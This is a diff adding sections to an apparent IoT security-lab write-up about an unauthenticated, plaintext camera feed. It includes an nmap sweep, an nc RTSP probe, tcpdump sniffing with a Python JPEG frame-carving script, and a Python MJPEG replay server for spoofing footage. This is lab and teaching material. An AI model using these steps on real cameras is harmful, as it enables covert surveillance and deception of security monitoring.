@@ -19,7 +19,7 @@ affected_components:
   - "labs/owlcam/files/etc/camapi/config_vuln.json"
 findings:
   - "IoT1: DONE"
-  - "IoT2: IN PROGRESS"
+  - "IoT2: DONE"
   - "IoT3: PENDING"
   - "IoT4: DONE"
 ---
@@ -74,6 +74,74 @@ ffplay http://192.168.2.1:9090/video
 Any viewer on the LAN can therefore watch the surveillance feed with no credentials at all.
 
 > **Note on the RTSP payload.** `v4l2rtspserver` ships the loopback MJPEG as JPEG-over-RTP (RFC 2435), which strips the JPEG Huffman and quantization tables and expects the receiver to rebuild them from the standard set. With this camera's tables the reconstructed frame is scrambled, so the reliably-decodable capture is the HTTP MJPEG feed on `:9090`. The RTSP service on `:8554-:8556` is still a valid unauthenticated network-service target for discovery and sniffing, it just does not render a clean picture on this build (H264-over-RTSP is not an option here, the on-device build ships no H264 encoder).
+
+## Recon and enumeration
+
+An `nmap` sweep of the camera exposes both streaming services with no authentication:
+
+```zsh
+nmap -sV -p 80,8554-8556,9090 192.168.2.1
+# 8554-8556/tcp  open  rtsp   v4l2rtspserver (no auth, no TLS)
+# 9090/tcp       open  http   HTTP MJPEG feed (no auth, no TLS)
+```
+
+The RTSP service answers an unauthenticated `DESCRIBE`, it never issues a `401`, and even a wrong path leaks the real mount point (`cam0`):
+
+```zsh
+printf 'DESCRIBE rtsp://192.168.2.1:8554/cam0 RTSP/1.0\r\nCSeq: 2\r\n\r\n' | nc 192.168.2.1 8554
+# RTSP/1.0 200 OK  ->  SDP media description, no credentials required
+```
+
+## Passive capture (cleartext sniffing, CWE-319)
+
+Because neither service uses TLS, an attacker with a foothold on the LAN (an ARP-spoof MITM position, a mirror/SPAN port, or a shared segment) can record the video off the wire while a legitimate viewer or the cloud API is watching:
+
+```zsh
+# On the attacker host, sniff the MJPEG feed while the victim watches
+tcpdump -i eth0 -s0 -w cam.pcap 'tcp port 9090'
+```
+
+Reassemble the TCP stream and carve the JPEG frames out of the plaintext body. In Wireshark this is "Follow TCP Stream" then "Save as", or from the command line:
+
+```zsh
+# Export the HTTP body, then split it on the JPEG SOI (FFD8) / EOI (FFD9) markers
+tshark -r cam.pcap --export-objects http,loot/
+python3 - <<'PY'
+data = open("loot/video", "rb").read()          # the multipart MJPEG body
+i = n = 0
+while True:
+    a = data.find(b"\xff\xd8", i)
+    b = data.find(b"\xff\xd9", a)
+    if a < 0 or b < 0:
+        break
+    open(f"frame_{n:03}.jpg", "wb").write(data[a:b + 2]); n += 1; i = b + 2
+print(n, "frames recovered from the sniffed cleartext")
+PY
+```
+
+The recovered `frame_000.jpg` is byte-for-byte the live camera image, no decryption and no credentials were needed. Verified on the lab: a frame reassembled from a `tcpdump` capture of `:9090` is identical to the on-device `/root/img_cam0.jpeg` (md5 `fb672c7edc971ea0a0d55da296fb81fe`).
+
+## Replay: feeding a monitor stale footage
+
+The same lack of authentication and integrity checking means captured footage can be replayed to a viewer. An attacker re-serves the saved frames as a fake live feed so an operator or the cloud API sees a frozen or looped scene instead of the real one:
+
+```zsh
+# Minimal MJPEG replay server that loops the captured frame
+python3 - <<'PY'
+from http.server import BaseHTTPRequestHandler, HTTPServer
+frame = open("frame_000.jpg", "rb").read()
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
+        self.end_headers()
+        while True:
+            self.wfile.write(b"--frame\r\nContent-Type: image/jpeg\r\n\r\n" + frame + b"\r\n")
+HTTPServer(("0.0.0.0", 9090), H).serve_forever()
+PY
+```
+
+Point the victim (or a MITM redirect) at the attacker's `:9090` and every client renders the replayed scene. Chained with the cloud API BOLA on `/snapshot` (see [[API/Vulnerabilities|API]]), the stale footage can be pushed through the ecosystem interface as well (this is the concrete path [[#IoT3:2018 - Insecure Ecosystem Interfaces (API)|IoT3]] owns).
 
 The consequences of exposing the feed over plaintext services:
 
